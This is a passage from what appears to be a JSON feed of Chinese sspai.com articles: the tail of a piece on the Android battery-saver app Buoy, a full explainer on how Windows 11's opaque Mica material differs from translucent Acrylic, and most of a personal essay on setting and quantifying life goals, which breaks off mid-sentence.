优化」后的省电模式自成一套体系，并不涉及 Android 省电模式，Buoy 在这类系统上会失效。</li>\n<li>Buoy 虽然是一款开源应用，但在 Play 商店里依旧象征性地售卖 1 美元，有条件的读者应该也可以尝试自行编译。</li>\n</ul>\n<h2>省电模式真的有必要吗</h2>\n<p>写完这篇文章，我不禁开始思索：在快充技术和移动电源普及的今天，街头随处可见供人租用的共享移动电源，省电模式存在的意义是什么？在我看来，无论是随身携带移动电源和数据线，还是在商场里租用，这些都需要付出一定的成本，可能是收纳空间的逼仄，可能是金钱或者等待充电的时间成本。而省电模式可以说是延长手机续航最免费、简单、快捷的方式了，在 Buoy 的用户留言里，不乏赞美之辞：「睡醒看到电量剩余 99%」「第一次工作到上午十点还有 93% 的剩余电量」。</p>\n<p>也希望这款小工具能够在关键时刻帮到你，可以不用再说出那句「还有几分钟就快到家了，请再坚持一下。」</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67475"},{"title":"具透 | 不透明的「半透明」：Windows 11 新材质如何欺骗你的眼睛","date":"2021-07-22 08:00:00","description":"\n<p>每一代 Windows 操作系统更新都伴随着设计语言的变化。最初的 Windows 经典外观（Classic Style）、Windows XP 时代的 Luna、Windows Vista 和 Windows 7 时代的 Aero Glass、Windows 8.x 时代的 Metro，一直到最为大家所熟知的 Windows 10 亚克力（Acrylic），不同的视觉风格和系统版本一一对应，相信在很多人的记忆中都留下了烙印。</p>\n<p>刚亮相不久、目前已经可以通过 Windows 预览体验计划 Dev 渠道体验到的 Windows 11 也不例外 —— 虽然相比 Windows 10，这次 Windows 11 在设计风格上的变化在第一时间非常容易让人混淆：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/ba28e48198920620187c52a4dcbca3ed\"></figure><p>同样是看上去「半透明」的设计，Windows 11 相比 Windows 10 究竟有什么不一样？在这篇文章中，我们就来对这个问题进行解答。</p>\n<h2>「亚克力」的美丽与代价</h2>\n<p>亚克力（Arcrylic）作为 Windows Fluent Design 的系统组件之一，在微软开发文档中被描述为一种「用于创建半透明纹理」的画笔。</p>\n<p>换句话说，亚克力并非你在 Windows 10 中看到的某个应用、某个窗口或某个界面控件，<strong>它是一种材料，一种通过透明度设计来为窗口内容增添纹理和深度的手段</strong>。</p>\n<p>事实上，符合微软设计标准的亚克力效果需要非常复杂的混合设计，包括对桌面背景、高斯模糊、明度混合、色调混合以及噪点材质的综合搭配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/5f5c9acbbaa3954112d8a9bc36437a0a\"><figcaption>亚克力的构成</figcaption></figure><p>与之对应的，微软也提供了 5 种具体的 <a href=\"https://docs.microsoft.com/zh-cn/windows/apps/design/style/acrylic#custom-acrylic-brush\" target=\"_blank\">属性参数</a> 来帮助开发者打造适合自己的亚克力效果。所以尽管很多时候我们都将 Windows 10 中的半透明效果叫做是「亚克力」，但实际看到的效果有可能是千差万别的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/7f33aa6a4310f167fa834ca2c63121e0\"><figcaption>不同属性参数数值决定了亚克力的实际呈现效果</figcaption></figure><p><strong>如果以某个具体的应用窗口为标的，亚克力可以被分为背景亚克力和应用内亚克力两种</strong>：前者可以看作是将应用窗口从桌面壁纸和其他应用窗口之间区分开来的手段，后者则主要用于在应用内部打造焦点和层次感。</p>\n<p>比如在最新版 <a href=\"https://www.microsoft.com/en-us/p/myersplash-photos/9nblggh4vcsn\" target=\"_blank\">MyerSplash</a> 当中，应用主体窗口在进行壁纸浏览时所采用就是背景亚克力，此时如果拖动其窗口，我们能够从 MyerSplash 的窗口背景中隐约看到其后的所有内容，无论是桌面壁纸还是其他应用窗口中的图文内容：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a06e70e5137703d8d2aa64781fb7bb22.png\"><figcaption>MyerSplash 主界面窗口的亚克力效果</figcaption></figure><p>但点击 MyerSplash 界面右上角的齿轮按钮进入应用设置，则会发现这里运用了应用内亚克力，此时 MyerSplash 的亚克力效果则以应用内的壁纸浏览界面为标的，透过设置界面能够隐约看到的内容其实是应用内的壁纸展示内容，拖动 MyerSplash 窗口时，被模糊的背景内容不会因为窗口位置的改变而发生变化：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/01f7553c6089063fab5b7692c2a970ed\"><figcaption>MyerSplash 设置界面用到的就是应用内亚克力</figcaption></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/35199\" target=\"_blank\">幕后丨他做了一款优雅的 UWP 壁纸应用，并对 UWP 的未来充满信心</a></p>\n<p><strong>而如果以具体的应用场景为例，亚克力效果则常常在应用在垂直窗格和一些瞬态图面当中</strong>——虽然微软并不建议在垂直窗格中应用亚克力，但 Windows 10 内置的日历、Groove 音乐、邮件等等应用都在左侧导航窗格区域使用了亚克力材料；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/2245add17bd6018eb846970dc5a28efd\"><figcaption>日历应用的侧栏也是亚克力效果</figcaption></figure><p>瞬态图面中的亚克力效果则在上下文菜单、弹出控件、弹出窗口等场景中常见，比如正在测试中的 Edge 93 就在浏览器内的弹出菜单中大量运用了亚克力材质。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/d82f0148c31961163836718e3a63aecb\"><figcaption>Edge 测试中的亚克力风格菜单</figcaption></figure><p><strong>最后值得一提的是，亚克力被微软看作是一种会大量占用 GPU 资源的设计材料</strong>，虽然没有具体的统计数据作为支撑，它的使用依然可能会导致设备功耗增加并缩短电池使用时间。在上文提到的 5 种具体的属性参数中，就有一项</p>\n<p><code>FallbackColor</code> 的参数用于向亚克力材料提供「回滚机制」的纯色参数。</p>\n<p>在 Windows 10 中，当设备进入节电模式时 Windwos 会自动禁用所有亚克力效果并将对应区域的颜色设定为回滚参数指定的纯色（如果你的设备较老、性能较差，也可以在「个性化 &gt; 颜色设置」手动关闭透明效果）；另外，采用背景亚克力效果的窗口在窗口失去焦点时也会暂时禁用亚克力、回滚到纯色模式。</p>\n<h2>让 Windows 11 的新材质「露馅」</h2>\n<p>Windows 11 终于为我们带来了更加简洁、现代化的新版资源管理器，但打开资源管理器后拖动窗口，你会发现 Windows 11 在资源管理器的窗口标题栏区域<strong>似乎</strong>也用了透明效果：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/1565be80c1c75a769739baf39eff4ebb.gif\"><figcaption>这里看上去的确有点像透明效果</figcaption></figure><p>是亚克力吗？不是。这种一开始甚至被很多人误解为毛玻璃效果的样式正是本部分的主角、微软在 Windows 11 引入的新材质 Mica。</p>\n<p>通过上一部分的内容中我们知道，亚克力是一种精密、复杂、华丽，同时又有着一定性能开销负担的材料。对当今的各种电子设备而言，任何一点「没有用在刀刃上」的额外性能开销，都是值得考虑和优化的。</p>\n<p>Mica 就是那个优化方案。</p>\n<p>对以「窗口」命名的 Windows 来说，通过视觉设计让我们在多个应用窗口之间快速把握住焦点是非常有必要的。尽管在视觉效果和实际作用上 Mica 和亚克力非常相似，但二者却有着本质上的区别。</p>\n<p><strong>最为核心的不同在于，Mica 是不透明的</strong>。</p>\n<p>作为一种更加节省性能开销的材料方案，Mica 仅会在桌面壁纸变化时对壁纸色彩进行一次取样，通过取样到的颜色生成材料色彩。所以本部分开头图片里的资源管理器尽管「看上去」似乎是半透明的、能够隐约看到桌面背景，但呈现这种效果其实只是因为资源管理器的窗口背景从桌面壁纸预先提取过一次样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/0edf366e3a3a97ab80c66c6efaebb63e.png\"><figcaption>无论背景内容是什么，通过 Mica 永远只能「看到」桌面壁纸</figcaption></figure><p>破解方法也很简单：如果你在采用 Mica 材质的窗口和桌面壁纸之间摆上其他内容，Mica 就会「露馅」—— 和能够实时以半透明样式展示后方内容的亚克力不同，Mica 窗口下方无论有什么内容，都会呈现最初从壁纸提取到的色彩样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5048c524161077ee2418630b6c2c3182.png\"><figcaption>微软建议将 Mica 应用在基础图层上，比如窗口背景 </figcaption></figure><p><strong>也正是因为这种特性，微软仅建议将 Mica 用在窗口的基础图层上</strong>。如此一来既能起到突出窗口主体的效果，又不会因为应用在弹窗这种地方但却无法实时透明带来令人困惑的视觉效果。</p>\n<p>事实上，如果仅仅从视觉效果上来说，Mica 更像是一种亚克力的「低配版」，或者说 Windows 11 针对一些需要长时间、频繁打开的窗口（比如资源管理器、系统设置）推出的「低功耗定制版」。如果运用得当，它比传统的纯色窗口标题栏更加温婉、细腻，同时又不会像亚克力那样带来太多额外的性能开销。</p>\n<p>其他方面 Mica 则与亚克力大同小异了，比如支持明、暗色切换，在窗口失焦时会自动回落到纯色效果等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/574a514a8152aa50bf9a730de803cc81.png\"><figcaption>透明效果目前同时掌管亚克力和 Mica</figcaption></figure><p>有意思的是，尽管 Mica 本身不算是一种透明的控件材料，但在 Windows 11 中它依然受「个性化 &gt; 颜色」下的「透明效果」选项控制。如果你关闭了这个选项，Mica 的取色效果也会随亚克力效果一并消失。</p>\n<h2>小结：亚克力与 Mica</h2>\n<p>尽管看上去很像「半透明」，但 Windows 11 引入的 Mica 的确是不透明的。要在 Windows 11 中将亚克力和 Mica 区分开来的方法也很简单 —— 在窗口和桌面壁纸之间塞点其他内容作为背景就好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/c24c8c11db8a092947e6d49aa3aab1eb.png\"><figcaption>烟雾效果，用于强调对话框内容</figcaption></figure><p>同时我们也不难看出，Mica 并非用于取代亚克力的。事实上，它和亚克力、烟雾（Smoke）效果一起构成了 Windows 11 的主要「材料」类型。如果你对 Windows 11 的其他设计规范感兴趣，不妨进一步阅读微软官方的 <a href=\"https://docs.microsoft.com/en-us/windows/apps/design/signature-experiences/design-principles\" target=\"_blank\">设计文档</a>。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67413\" target=\"_blank\">Windows 11 要更新了，这些变化能让你心动吗？</a></li>\n<li><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 泄露版上手体验</a></li>\n<li><a href=\"https://sspai.com/post/67498\" target=\"_blank\">升级 Windows 11 碰壁了？送你一份尝鲜指南</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，第一时间解读 Windows 动态 🐱‍🏍</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67836"},{"title":"从目标设定到逐步完成，这是我的人生规划方法论","date":"2021-07-22 06:00:11","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2><strong>前言</strong></h2>\n<p>提到「目标」这个词，我总会想起几年前定下的那些 Flag：明明规划的那么清楚，为什么我没有执行呢？定下目标时的激情是真，三分钟热度也是真，最后不想做了也是真（，像极了爱情里面的承诺）。</p>\n<p>上半年和咨询师讨论目标的制定和完成情况，同时翻了少数派站内的其他文章，发现大部分定制目标的文章中是在讲如何制定（职业规划、学习进展）、用什么方法论（OKR、KPI）或是用什么工具（项目管理类、Todo 类）。</p>\n<p>我个人认为这个是开始阶段，能让我们更好的定目标，知道目标在哪里，但是对<strong>完成它</strong>这个事情没多大帮助。结合我本人几年前构想的一个量化项目，以及对目标定制的一些讨论和想法，我来分享一下自己的经验与体会。当然每个人有不同的标准，如果它对你有一点点帮助，那就很好。</p>\n<p>本文主旨在于回归<strong>自我</strong>，目标一词在本文的概念更偏向人生规划，希望能给大家带来一些其他的视角和思考。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/0d9e55626e70d8d6083a199375bbe9f3.png\"><figcaption>下文太长，🍐个框架</figcaption></figure><h2><strong>目标的核心功能：取悦自我</strong></h2>\n<p>这里首先要说明的是，目标本身可以与社会评价体系无关：<strong>我们可以考虑与社会评价体系之外的分类、可以设定与社会评价违背的目标。</strong></p>\n<p>就我的观点看来，不是所有的人都需要设定一个主观目标的，因为每个人的生活态度不同：可以随遇而安、可以与世无争、可以随俗浮沉、遇到问题就解决问题，同样可以幸福的过日子。对于安逸派这类生活态度，强行定一个目标反而会因为倍感压力而降低了生活的幸福感。</p>\n<p>我们应该先考虑<strong>目标背后的意义</strong>，确定是否真的有<strong>必要性</strong>。</p>\n<p>而这里的问题在于，<strong>意义</strong>在大多数时候是一个被社会评价影响很深的概念。迫于家庭、职业、生存压力，我们会将目标和规划的<strong>意义</strong>最终落地到社会地位、社会财富上，通过<strong>对比</strong>来体现自己的价值，这些固然无可厚非，但基于对比而确立的目标并不一定让我们过得更好，基于社会评价而建立的目标在个人看来并不是正确的起点，它忽略我们自身的感受，再退一步讲，如果我们自己都不开心，那怎么会把那些目标完成的有声有色呢？</p>\n<p>其次，让日子过得开心些，也不是仅仅靠那些一般社会成就就可以的。在我理顺本文的框架之前，我也从没考虑过之前定的目标有什么问题，好像作为学生，考个好分数就是最大的事情、作为员工，为公司创造价值就是重要的事情、作为独生子，传宗接代就是理所应当的事情。</p>\n<p>然而，我们的生活不是被别人安排好的，社会对比和约束固然重要，但作为一个独立的个体，理应当要为自己考虑考虑的，只谈上面这些也太焦虑了，好像我们是在替别人过日子，只是一个有姓名的棋子似的。</p>\n<p>对于做过目标和规划的读者，可以参照本文后，结合自己的规划看看：把目标按照分类概括一下，对比自己的目标是否覆盖到下面几个方面。一般情况下，像我一样，定目标的时候仅包含以下分类中的几个而忽略了其他：<strong>健康、愿望、生活、职业、关系、学习、娱乐</strong>（按照作者主观重要性降序）。</p>\n<p>按照我收集的经验，容易被忽略的是<strong>健康、愿望、关系</strong>这几个方面，毕竟这些内容只有自己清楚，他人不好插手，碍于交往的边界，很少有人会提醒我们<strong>关心自己</strong>。</p>\n<p>下面我会一个一个来展开说明，即本文第二部分，只涉及<strong>分类的描述</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/4b84fa6055017f4c55400732e605c6bb.png\"><figcaption>本文的框架长这个样子，下面我们一起填</figcaption></figure><h3><strong>健康</strong></h3>\n<p>当这个分类被列出来的时候，它的目的就达到了——这是一个社会评价中不会关心到的分类，将它放到目标内，是因为大多数健康的人会忽略身体健康这个前提条件。</p>\n<p>身体健康，除了有问题时针对问题，<strong>饮食情况、运动情况、睡眠情况，这些都是健康范畴</strong>，可能现在不需要关心，但是我们总会老的，它终有一天要被考虑。这些方面站内有许多专业的文章讨论，这里就不在大佬面前卖弄了～</p>\n<p>作为一名互联网搬砖工，我所在公司会安排员工一年体检一次，这样很好。作为体检的受益者，比如天天吃外卖被检查的医生说有轻度脂肪肝，因此开始注意饮食问题（我之前完全以为这是个老年人才会有的问题）。所以我强烈建议各位如果有条件的话，可以定期体检，去了解身体状况，即便没有问题，也能通过每次结果对比得到一些生活上的建议。题外话：当然体检报告详情还是保密的好。</p>\n<p>除了把生理指标或者检查作为健康方面的一个目标外，心理健康可能常常被人忽略。这一项可大可小，如果自我感觉不太好，可以考虑线上做个简单的评估量表，或者是去精神科门诊做检查，寻求心理咨询。这里值得一提的是，目前社会上对心理评估的接受程度并没有很高，读者可以在这方面酌情考虑。</p>\n<p>就自身而言，本文的灵感即产生于抑郁和焦虑的咨询过程中，我察觉到自己情绪和状态的问题后，考虑到温和性，以及为之后从事相关行业做准备，就先寻求了咨询的支持，同时为了了解清楚自己的状态也去做了精神科的检查，实际上本文的一部分就是在精神科复查路上完成的。</p>\n<p>自己的健康状况一定要清楚，不舒服要及时检查，千万不要把小问题拖成大问题，这也是为什么要把健康放到第一位。</p>\n<h3><strong>愿望</strong></h3>\n<p>允许目标随心所欲。</p>\n<p>这一节是广义的目标：允许目标不实现、允许它可能要花个几百年才能实现。愿望是<strong>唯一</strong>放飞自我的分类，缺少这一栏的话，在我看来这个表格会很没趣、太现实了，让我们来点浪漫主义吧，无论它是阳光、阴暗、精神、物质的，比如，世界和平？</p>\n<p>我自己的愿望一栏就有一个一区 SCI 一作，我写的时候我都觉得我在瞎扯，但总觉得不写上去枉我看了那么多科普和论文，不过这也反映了我自己的学术倾向和兴趣，说不好是愿望在成全兴趣还是兴趣成全愿望。</p>\n<p>另外我还想当一只混吃等死的咸鱼，结果将他具体化后发现这一条实在是难度太高，最起码，它要求被动资产增值速度 cover 住支出，为了这个愿望我要去修改不少职业、生活方面的规划，但我相信这个愿望还是有几率实现的。</p>\n<p>不过，环境、社会、自己都是在变化的，可能愿望就突然有机会实现了呢？比如愿望是彩票中 10 个亿，结果看完这段话第二天你就中了，虽然这个概率很低。唯心主义一点说，愿望在脑海中产生就必然有它的意义，这是我们倾向生活的表现，再不济它也是自我实现的一部分，适当的满足一些本我的需求，日子说不定就过的就更轻松了呢。</p>\n<h3><strong>生活</strong></h3>\n<p>稳定的生活是发展的前提。</p>\n<p><strong>生活</strong>分类主要是说稳定的生活环境，像是人生规划，例如定居城市、家庭、婚姻、生育方面的目标。很多人说我要脱单！这就是一个生活方面的目标。</p>\n<p>但是，这里的说法可不是一定要脱单、结婚、生孩子，我们先跳出一般的的社会评价，可以选择拒绝，这仍然是一个目标。<strong>这是你的目标、你的规划，与他人评价无关</strong>，其他人的评价和规则那是另一回事，不要在制定目标内容的时候混进来，这其实是<strong>难点</strong>的一部分。</p>\n<p>我认为这个分类的影响面太大了，生活方面的目标前后会搭进去几十年，所以对于尚不明朗的小伙伴，可以向下级拆分，扩展对某一分支的了解：比如不知道去哪个城市安家，就可以把关注点列一下，衣食住行等等，然后收集资料也好，实地考察也罢，<strong>目标可以是确定另一个目标的过程</strong>。</p>\n<p>定居城市选择上，我的一选是上海，次选是杭州和成都。大学毕业前后我在全国大部份城市都转了一圈，甚至有的住了一段时间，着重考察了职业发展和衣食住行等各个方面后，觉得上海比较适合自己。当然了，定居城市还需要考虑未来伴侣的因素，那么现在我已经形成自己的结论后，就可以不管它，留着将来讨论。对于一些同学，如果两个人都没有具体的方向，随缘也没什么问题，毕竟纠结很长时间在一个对自己不是很重要的问题上，太累了。</p>\n<p>本来<strong>定个目标是为了生活的更好，如果反而要承受一大堆痛苦那不如不搞</strong>，不必为了像完成任务一样逼自己。</p>\n<h3><strong>职业</strong></h3>\n<p>实现社会价值，维持生活。</p>\n<p>好吧，我们总是要生存的。这里的职业就是狭义的，排除兴趣因素的，指用于获得金钱或其他生存必需品的有规律的行为。</p>\n<p>个人认知而言，职业的目标稳定性比生活这一项差很多，在初步设定的时候，我们可以笼统一些。例如简单列出发展的行业或者岗位。而对于没有了解过行业和职业规划的读者而言，可以做一些行业调研，关注一下这个行业、岗位日常的工作有哪些，以及<strong>前</strong> <strong>5% 的人和前 50% 的人的工作内容差异</strong>。</p>\n<p>不同职业有不同职业的特点，可以在这个分类上首先对自己从事的主职业有较深理解后，再设定目标。回想一下小时候的梦想，我小时候是当科学家，后面再大一点是当律师，但现在从事的跟他们都没什么关系。</p>\n<p>除了主职业，还可以在这一分类上写副职。</p>\n<p>作者本人从事的是互联网行业，并且选择的很早，几乎没有在主职业方向（网络安全）上犹豫过，但仍然去了解了互联网其他方向岗位的情况，了解了这些岗位要做什么，竞争的点在哪里，薪资水平怎么样，准入和天花板都是什么。互联网行业有明显的后发优势的特点，先不论是否会因为年龄成长而淘汰，至少给自己留一个退路是没错的，所以作者选择了心理咨询方向作为备选，不论什么时候开始从事这个方向，这是一个资历与从业时间正相关的行业，正好与主职业形成互补。</p>\n<p>总之，职业就是先让我们吃饱饭，有了这些才能考虑些其他有的没的。</p>\n<h3><strong>关系</strong></h3>\n<p>人是环境和社会的动物。</p>\n<p>这一个分类是源自咨询过程的建议，有一定的门槛。我们与父母、朋友、同事、陌生人的关系们，是我们获得支持和陪伴的源泉，当背后有力量支撑我们时，就会敢于面对挑战和失败。但同时，重要关系的质量会影响我们的健康和决策。</p>\n<p>有人希望改善和父母的关系，有人希望能和伴侣无话不谈。除了对关系的期许，如果在原生家庭、关系建立、重大决策上有矛盾的，可以着重考虑这一项。我们可以让问题先暴露出来，有一个初步的处理意向，再去寻求专业人士讨论如何去解决它。</p>\n<p>弱关系也对我们有所影响或启示，可以考虑把「建立一个怎样的第一印象」这类放在这个目标中。在日常聊天水群中，每个人也会不可避免地被评价被议论，对比较敏感的人群来说，维护一个自己期望的在他人心目中的形象也是关系目标的一部分，而这份期望就可以成为从事其他活动的动力。</p>\n<p>为了避免给自己太大压力，如果在关系上没什么诉求，也可以将该项忽略。</p>\n<p>实际上我在这个方面就有点自暴自弃，用咨询师的话说就是「自己关门了」，可能对我个人来说，关门带来的安全感更强一些。毕竟我们要做的是自己舒服的目标，即使它可能有问题，只要不做违法乱纪和伤害他人的事情就好。</p>\n<h3><strong>学习</strong></h3>\n<p>终生学习已经是生存要义了。</p>\n<p>因为职业发展所需的学习内容暂时不在此列，这也是将学习分类放到靠后的原因。</p>\n<p>我认为主动学习的过程还是很快乐的。该类别主要是基于<strong>个人兴趣</strong>制定的目标或规划。除开单纯为了学而学，它有其功利的部分：作为对抗知识焦虑的手段，获取知识能让我们的生存更有安全感；同时学习到的本身就是技能，可以作为一项隐藏的退路，这一点和副职业异曲同工；往往进入一个领域需要大量时间的沉淀，这个长时学习过程本身是提升我们专注能力和审美品味的过程。</p>\n<p>可能这个说法还是让人感觉压力很大，有点无从下手，那不如考虑下写一个「飘忽」一点的目标呢？例如学习唱歌，至于学到什么程度，什么时候，管他呢？我们追求的是自我满足，在此基础上能有收获属于锦上添花。经过努力把 N2 考下来，和偷偷摸摸去 KTV 练歌最后被同学夸赞，都令人开心。</p>\n<p>学习和总结是我对抗焦虑的手段，有时候我不去追求记住，而是完成了学习这件事情。我有一项内容是每周翻阅 Researcher 和领研网的论文然后把它们加入到 Papers 中，你说看个摘要和结论它能有多大专业意义呢？从学术上看是没多少的，但这段时间是用于学习，会让我因为学了、了解了形成满足感，最不济它也是个扩宽思路、茶余饭后谈资的内容。</p>\n<p>更多的时候，<strong>保持学习这个行为比学什么要重要得多</strong>。</p>\n<h3><strong>娱乐</strong></h3>\n<p>没想到吧，这也能当做目标！</p>\n<p>对于我这种日常焦虑的人来说将它列到目标中是一个缓解情绪的好办法，无意义的消磨时间固然轻松，但负罪感指数很高，往往演变成：玩也玩了，但越玩越焦虑的状况。</p>\n<p>我在这一分类首先关注的是需要大块时间的部分。毕竟人生是需要有享乐的时间的，如果不专门分配这一项，最后的结果大多是来不及、没时间，先不论目的是什么，<strong>错过本身就是一种让人负面的情绪</strong>。比如我想去重庆旅游几天，那么就需要明确的时间划分，用于和同行人确定时间、为出门做规划等等。</p>\n<p>另一方面，不止<strong>个人</strong>的娱乐，和朋友、伴侣、父母等一起玩耍的时间已经越来越奢侈了，认认真真<strong>了解与 TA 的共同兴趣</strong>，设计和完成一项娱乐活动，对关系的发展也有益处，可能感情的升温就差这一个契机呢？</p>\n<p>毕竟我们制定目标的意义就在于让生活，包括现在和未来，都更有幸福感，所以尽可能地列出曾经所有的心动，然后一点点看着它实现吧。</p>\n<p>如果实在没什么长时远门的打算，也可以把经常放松的活动拿出来列出来，比如打打游戏、刷刷短视频，然后安排一个条件，比如 App 时间限制或是达到什么游戏内的成就，这些限制或挑战引入了紧张和成就感，能让我们更沉浸在这个活动中，这会比漫无目的的将时间一股脑分配要更有体验感的多。</p>\n<p>我之前对对剧本杀无感，到现在去的还是挺勤快的，按照上面的逻辑，其实我本来对剧本杀这类就是当作一个 kill time 的活动，但自从我打算记录一下踩过的坑，比如每次写一句总结，某某店家隔音不好、某某家 DM 不合格之类、某某家别的都好就是地方不好找、哪个剧本逻辑硬伤之类的，无形中把我从单纯的玩家变成了一个对这段时间过得有更高要求的评论人，有这份结论性质的输出，让我意识到这个时间过的是有意义的，而这就会让我认为：<strong>这段时间值得</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/2501d82f7886a2b8c954f5a0f8469051.png\"><figcaption>谁去关心生存、健康、关系..……只有你自己</figcaption></figure><h2><strong>用量化将目标变得可执行</strong></h2>\n<p>现在表格中应该有不少粗略的目标了，下面我们对它作出一些补充解释，对表格内容做一些横向扩展：通过时间、拆解、标准等方式把抽象的目标变成任务，而不是一个宏大的概念让人无从下手。</p>\n<h3><strong>时间：什么时候做</strong></h3>\n<p>首先，我们的目标要有一个预计完成时间，包括愿望在内，将希望它<strong>开始和期望完成的时间</strong>写在表格的再右边。</p>\n<p>设定时间是一项仪式，告诉我们这件事情需要花时间去规划、完成。</p>\n<p>之前在量化时我喜欢只写完成时间，这样设定完后会发现事情太多，所以这里可以按照 Todo 任务的方法，把事情分为现在就要开始的、未来某个时间要开始的、不知道什么时候要开始的，按照这个规则填写开始和期望完成的时间。</p>\n<p>这里可能会遇到几个较复杂的情景：</p>\n<p>一是不好标定时间，好像什么时候都可以。例如它是个一次性非紧急事件，这种需要关注下它的<strong>演变</strong>，随着时间流逝它的紧急程度、重要性程度是否会变化，寻找拐点给它标定时间，比如我有个蛀牙一直都懒得去处理（虽然检查机构一直催）。</p>\n<p>二是不知道标多久的时间，无法评估它多久能完成。例如一个目标需要较长时间积累，甚至连进度条都没参照物的情况，这种情况我会去考虑它功利的部分，即我想什么时候体验到这个目标带来的益处。比如作者准备的副职业心理咨询师，17 年实习的时候错过了最后一次考证，现在它是禁考状态，另一方面它不需要现在就交差，所以我有足够的时间去安排上课、体验体验，最后我希望它能 2030 年后成为收入的一部分，所以这个时间就出来了。</p>\n<p>也有确实什么信息都没有，单纯一个想法的目标。这时不忘初心，随心所欲定个时间放那里吧，又不是不能改，<strong>这些东西可不是向别人交差的</strong>，我的 SCI 目标开始和完成时间都写的 ∞。</p>\n<h3><strong>具体：清晰明确的结果</strong></h3>\n<p>表格右边继续添加两列：<strong>标签</strong>和<strong>衡量标准</strong>，意思到了就好，字段名什么的自由取啦。</p>\n<p>做过项目管理的同学知道在制定计划时，一般会自上而下地将大目标拆解成<strong>里程碑。</strong>通过拆解和量化，几年目标就可以指导每周的工作。对一个笼统的目标而言，我们也需要将它用<strong>可衡量的</strong>指标<strong>具体的</strong>描述出来，让他指导我们的日常生活。</p>\n<p>这一节的核心一方面是考虑如何完成这歌目标，另一方面有点在<strong>劝退那些可以不做但会带来压力的目标</strong>，毕竟高追求是人的共性。因此，本节中的<strong>标准定得越低越好</strong>，在制定过程中如果感觉到目标带来了很大的压力，可以删掉或是把时间拉到很长，压力太大时我们更容易产生放弃情绪，至少我是这样子的，咸鱼多舒服哇。</p>\n<p>回到表格上来。</p>\n<p>标签的作用是对目标进行初步细分和补充，这是我从文件管理类 App 中抄过来的做法，同一个目标在不同人眼里也有不同的倾向性。</p>\n<p>比如就健身这个事情而言，标签可以是健康、快乐、好看、打发时间、攀比等等，它表现的是目标的<strong>倾向性</strong>，这是单一分类做不到的；标签也对目标做了<strong>补充解释</strong>和表明<strong>态度</strong>，比如它的前置条件是什么，是否需要出门、是否需要制定规划，都可以在标签上体现。</p>\n<p>衡量标准确定了进度条该怎么走。难点在于它需要对目标所属学科有个初步的认识，或是自己有一套可量化的衡量标准。我们还是用健身举栗子：先搞清楚自己的预期，即上面的标签所代表的倾向性，比如我健身的目的就是为了减下来小肚子，因为我觉得胖了走路会累；之后需要去了解或者有自己的一套评判体系，单纯笼统的身材好是没法判定的，因为好这个标准太过于主观，我选择的是体脂和体重（实际上更科学的是腰围），再加上我自己坐下来的直接视觉；最后形成一个客观的尽量精确的描述：坐下来肚子没褶，当然它有点难，所以如果半年减 5kg 也能达到我的预期标准啦。</p>\n<p>一般来说，不要定过高的标准，比如想半年把日语从 0 学到 N1，除非有迫切的需求和保证充足的时间，不然这会变成一项负担，而负担就会让人想直接放弃，没错，我就是说我自己，我甚至为了逼自己一把还想先把 N1 报名了。</p>\n<p>不过，太过于具体的目标会增大压力。有一些目标可以<strong>把过程而非结果定为判定标准，即做了而不是做到</strong>，我们就不需要为此设定一个及格线：比如我要去 10 个地方旅游，那去了就好了，不需要为任何人交差和报备；减肥了一点点和减肥了 20kg 都是减了。这样心理上感觉就轻松了许多。</p>\n<p>同理，娱乐、学习、兴趣等方面都可以用<strong>做了与否</strong>作为判定而不是达到什么效果交了什么作业。</p>\n<h3><strong>评估：它的难点在哪里</strong></h3>\n<p>本节对目标进行可行性分析和难度预估，需要先完成对目标完成的判定标准。</p>\n<p>继续在表格右侧添加两列：<strong>可达性</strong>和<strong>难点</strong>。</p>\n<p>可达性是 0% 到 100% 的一项评分，替代平时的易到难的描述，也可以理解成主观认为能达到的完成程度，0% 就是觉得完成不了，但是想做的，100% 就是必须做或者一定能完成的。</p>\n<p>这一点初衷是防止目标判定标准太高而导致中途放弃，通过主观 × 